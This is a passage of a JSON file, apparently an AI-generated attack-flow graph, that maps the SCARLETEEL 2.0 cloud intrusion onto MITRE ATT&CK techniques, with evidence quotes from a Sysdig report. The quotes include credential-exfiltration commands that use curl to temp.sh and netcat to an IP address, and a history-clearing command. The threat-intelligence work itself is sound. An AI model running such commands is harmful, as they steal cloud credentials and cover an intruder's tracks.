+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 23,
+        "technique_id": "T1498",
+        "technique_name": "Network Denial of Service",
+        "description": "Network Denial of Service observed during Impact: they also downloaded and executed Pandora, a malware belonging to the Mirai Botnet... responsible for many large-scale DDoS attacks",
+        "tactic_id": "TA0040",
+        "evidence_quote": "they also downloaded and executed Pandora, a malware belonging to the Mirai Botnet... responsible for many large-scale DDoS attacks",
+        "evidence_sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "aws_services_involved": []
+      }
+    ],
+    "edges": [
+      {
+        "source": "T1190",
+        "target": "T1059.004",
+        "source_step": 1,
+        "target_step": 2,
+        "source_technique_name": "Exploit Public-Facing Application",
+        "target_technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "After exploiting some JupyterLab notebook containers deployed in a Kubernetes cluster, the SCARLETEEL operation proceeded with multiple types of attacks.",
+          "the actor leveraged several versions of scripts that steal credentials... it uses shell built-ins to accomplish this instead of curl."
+        ]
+      },
+      {
+        "source": "T1059.004",
+        "target": "T1610",
+        "source_step": 2,
+        "target_step": 3,
+        "source_technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "target_technique_name": "Deploy Container",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "the actor leveraged several versions of scripts that steal credentials... it uses shell built-ins to accomplish this instead of curl.",
+          "this script runs an Alpine Docker image installing static-curl in it."
+        ]
+      },
+      {
+        "source": "T1610",
+        "target": "T1098.001",
+        "source_step": 3,
+        "target_step": 4,
+        "source_technique_name": "Deploy Container",
+        "target_technique_name": "Additional Cloud Credentials",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "this script runs an Alpine Docker image installing static-curl in it.",
+          "Using the new admin privileges, the adversary created new users and a new set of access keys for all the users in the account, including admins."
+        ]
+      },
+      {
+        "source": "T1098.001",
+        "target": "T1136.003",
+        "source_step": 4,
+        "target_step": 5,
+        "source_technique_name": "Additional Cloud Credentials",
+        "target_technique_name": "Cloud Account",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "Using the new admin privileges, the adversary created new users and a new set of access keys for all the users in the account, including admins.",
+          "One of the users created was called 'aws_support' which they switched to in order to conduct reconnaissance."
+        ]
+      },
+      {
+        "source": "T1136.003",
+        "target": "T1078.004",
+        "source_step": 5,
+        "target_step": 6,
+        "source_technique_name": "Cloud Account",
+        "target_technique_name": "Cloud Accounts",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "One of the users created was called 'aws_support' which they switched to in order to conduct reconnaissance.",
+          "they managed to gain access to the 'AdminJoe' user by creating access keys for it."
+        ]
+      },
+      {
+        "source": "T1078.004",
+        "target": "T1548",
+        "source_step": 6,
+        "target_step": 7,
+        "source_technique_name": "Cloud Accounts",
+        "target_technique_name": "Abuse Elevation Control Mechanism",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "they managed to gain access to the 'AdminJoe' user by creating access keys for it.",
+          "the actor discovered and exploited a customer mistake in an AWS policy which allowed them to escalate privileges to AdministratorAccess and gain control over the account"
+        ]
+      },
+      {
+        "source": "T1548",
+        "target": "T1562.004",
+        "source_step": 7,
+        "target_step": 8,
+        "source_technique_name": "Abuse Elevation Control Mechanism",
+        "target_technique_name": "Impair Defenses: Disable or Modify System Firewall",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "the actor discovered and exploited a customer mistake in an AWS policy which allowed them to escalate privileges to AdministratorAccess and gain control over the account",
+          "It starts deleting the current IPtables rules and sets the firewall to make them fully permissive."
+        ]
+      },
+      {
+        "source": "T1562.004",
+        "target": "T1070.003",
+        "source_step": 8,
+        "target_step": 9,
+        "source_technique_name": "Impair Defenses: Disable or Modify System Firewall",
+        "target_technique_name": "Indicator Removal: Clear Command History",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "It starts deleting the current IPtables rules and sets the firewall to make them fully permissive.",
+          "history -cw\nclear"
+        ]
+      },
+      {
+        "source": "T1070.003",
+        "target": "T1070",
+        "source_step": 9,
+        "target_step": 10,
+        "source_technique_name": "Indicator Removal: Clear Command History",
+        "target_technique_name": "Indicator Removal",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "history -cw\nclear",
+          "the script removes the evidences of the attack, calling the notraces() bash function"
+        ]
+      },
+      {
+        "source": "T1070",
+        "target": "T1036.005",
+        "source_step": 10,
+        "target_step": 11,
+        "source_technique_name": "Indicator Removal",
+        "target_technique_name": "Match Legitimate Resource Name or Location",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "the script removes the evidences of the attack, calling the notraces() bash function",
+          "The Monero miner is executed in background using the names for containered and the systemd service as a defense evasion technique"
+        ]
+      },
+      {
+        "source": "T1036.005",
+        "target": "T1599",
+        "source_step": 11,
+        "target_step": 12,
+        "source_technique_name": "Match Legitimate Resource Name or Location",
+        "target_technique_name": "Network Boundary Bridging",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "The Monero miner is executed in background using the names for containered and the systemd service as a defense evasion technique",
+          "By using the '--endpoint-url' option, they did not send the API requests to the default AWS services endpoints, but instead to hb.bizmrg.com... These requests were not logged in the victim's CloudTrail"
+        ]
+      },
+      {
+        "source": "T1599",
+        "target": "T1552.005",
+        "source_step": 12,
+        "target_step": 13,
+        "source_technique_name": "Network Boundary Bridging",
+        "target_technique_name": "Cloud Instance Metadata API",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "By using the '--endpoint-url' option, they did not send the API requests to the default AWS services endpoints, but instead to hb.bizmrg.com... These requests were not logged in the victim's CloudTrail",
+          "Those scripts search for AWS credentials in different places: by contacting the instance metadata (both IMDSv1 and IMDSv2)"
+        ]
+      },
+      {
+        "source": "T1552.005",
+        "target": "T1552.001",
+        "source_step": 13,
+        "target_step": 14,
+        "source_technique_name": "Cloud Instance Metadata API",
+        "target_technique_name": "Credentials In Files",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "Those scripts search for AWS credentials in different places: by contacting the instance metadata (both IMDSv1 and IMDSv2)",
+          "The get_aws_data() function also searches for credentials in all Docker containers in the target machine (even if they are not running) and in the filesystem"
+        ]
+      },
+      {
+        "source": "T1552.001",
+        "target": "T1555",
+        "source_step": 14,
+        "target_step": 15,
+        "source_technique_name": "Credentials In Files",
+        "target_technique_name": "Credentials from Password Stores",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "The get_aws_data() function also searches for credentials in all Docker containers in the target machine (even if they are not running) and in the filesystem",
+          "they started to use the other new accounts created or the account compromised to achieve the same purposes by stealing secrets from Secret Manager"
+        ]
+      },
+      {
+        "source": "T1555",
+        "target": "T1580",
+        "source_step": 15,
+        "target_step": 16,
+        "source_technique_name": "Credentials from Password Stores",
+        "target_technique_name": "Cloud Infrastructure Discovery",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "they started to use the other new accounts created or the account compromised to achieve the same purposes by stealing secrets from Secret Manager",
+          "the SCARLETEEL actor started conducting automated reconnaissance in the victim's AWS environment. After some failed attempts to run EC2 instances, they tried to create access keys for all admin users."
+        ]
+      },
+      {
+        "source": "T1580",
+        "target": "T1613",
+        "source_step": 16,
+        "target_step": 17,
+        "source_technique_name": "Cloud Infrastructure Discovery",
+        "target_technique_name": "Container and Resource Discovery",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "the SCARLETEEL actor started conducting automated reconnaissance in the victim's AWS environment. After some failed attempts to run EC2 instances, they tried to create access keys for all admin users.",
+          "The 'get secrets', 'get pods' and 'get namespaces' APIs called in the screenshot below are part of the execution of peirates."
+        ]
+      },
+      {
+        "source": "T1613",
+        "target": "T1087.004",
+        "source_step": 17,
+        "target_step": 18,
+        "source_technique_name": "Container and Resource Discovery",
+        "target_technique_name": "Cloud Account",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "The 'get secrets', 'get pods' and 'get namespaces' APIs called in the screenshot below are part of the execution of peirates.",
+          "they tried to create access keys for all admin users. The victim used a specific naming convention for all of their admin accounts similar to 'adminJane,' 'adminJohn,' etc."
+        ]
+      },
+      {
+        "source": "T1087.004",
+        "target": "T1530",
+        "source_step": 18,
+        "target_step": 19,
+        "source_technique_name": "Cloud Account",
+        "target_technique_name": "Data from Cloud Storage",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "they tried to create access keys for all admin users. The victim used a specific naming convention for all of their admin accounts similar to 'adminJane,' 'adminJohn,' etc.",
+          "they configured the keys for the Russian S3 environment with the 'configure' command and then attempted to access their buckets."
+        ]
+      },
+      {
+        "source": "T1530",
+        "target": "T1041",
+        "source_step": 19,
+        "target_step": 20,
+        "source_technique_name": "Data from Cloud Storage",
+        "target_technique_name": "Exfiltration Over C2 Channel",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "they configured the keys for the Russian S3 environment with the 'configure' command and then attempted to access their buckets.",
+          "Looking at the exfiltration function, we can see that it sends the Base64 encoded stolen credentials to the C2 IP Address."
+        ]
+      },
+      {
+        "source": "T1041",
+        "target": "T1567",
+        "source_step": 20,
+        "target_step": 21,
+        "source_technique_name": "Exfiltration Over C2 Channel",
+        "target_technique_name": "Exfiltration Over Web Service",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "Looking at the exfiltration function, we can see that it sends the Base64 encoded stolen credentials to the C2 IP Address.",
+          "SEND_AWS_DATA_CURL=$(curl --upload-file $CSOF https://temp.sh)... SEND_AWS_DATA_NC=$(cat $CSOF | nc 5.39.93.71 9999)"
+        ]
+      },
+      {
+        "source": "T1567",
+        "target": "T1496",
+        "source_step": 21,
+        "target_step": 22,
+        "source_technique_name": "Exfiltration Over Web Service",
+        "target_technique_name": "Resource Hijacking",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "SEND_AWS_DATA_CURL=$(curl --upload-file $CSOF https://temp.sh)... SEND_AWS_DATA_NC=$(cat $CSOF | nc 5.39.93.71 9999)",
+          "With the admin access, the attacker created 42 instances of c5.metal/r5a.4xlarge in the compromised account... our conservative estimate is that their mining would have cost over $4,000 per day until stopped."
+        ]
+      },
+      {
+        "source": "T1496",
+        "target": "T1498",
+        "source_step": 22,
+        "target_step": 23,
+        "source_technique_name": "Resource Hijacking",
+        "target_technique_name": "Network Denial of Service",
+        "sources": [
+          "https://sysdig.com/blog/scarleteel-2-0/"
+        ],
+        "evidence_quotes": [
+          "With the admin access, the attacker created 42 instances of c5.metal/r5a.4xlarge in the compromised account... our conservative estimate is that their mining would have cost over $4,000 per day until stopped.",
+          "they also downloaded and executed Pandora, a malware belonging to the Mirai Botnet... responsible for many large-scale DDoS attacks"
+        ]
+      }
+    ]
+  },
+  "framework": {
+    "name": "mitre-attack",
+    "version": "unknown"
+  },
+  "schema_version": "1.0",
+  "incident_slug": "sysdig-2023-july",
+  "analyzed_at": "2026-04-15T21:29:55.368184+00:00",
+  "model": "claude-sonnet-4-6",
+  "source_chars": 32869
+}
